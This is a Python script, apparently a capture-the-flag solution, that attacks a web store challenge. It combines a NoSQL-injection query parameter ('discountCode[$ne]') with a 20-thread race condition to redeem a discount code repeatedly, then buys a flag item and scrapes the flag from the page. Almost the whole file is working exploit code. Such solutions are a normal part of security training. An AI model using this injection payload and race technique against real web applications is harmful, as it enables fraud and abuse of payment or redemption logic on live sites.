import requests
from faker import Faker
from bs4 import BeautifulSoup
import threading

s = []
snum = 20
fake = Faker()
url = "http://speed.challs.srdnlen.it:8082/"

data = {
		"username":fake.user_name(),
		"password":fake.password()
		}

# Exploit the NoSQLInjection
def req(i):
	s[i].get(url + "redeem?discountCode[$ne]=test")
	
th = []

# Exploit the race condition
for i in range(snum):
	s.append(requests.Session())
	
	if i == 0:
		s[i].post(url + "register-user", json=data)
	
	s[i].post(url + "user-login", json=data)
	
	x = threading.Thread(target=req, args=(i,))
	th.append(x)
	
for i in range(snum):
	th[i].start()
	
for i in range(snum):
	th[i].join()

# Login 
session = requests.Session()  
session.post(url + "user-login", json=data).text

# Flag Purchase
session.post(url + "store", json={"productId": 4})

# Flag extraction
print("\nFLAG: " + BeautifulSoup(session.get(url, timeout=20).text, 'html.parser').find('p', class_='card-text', string=lambda t: t and 'Flag:' in t).get_text().split('Flag: ')[1])
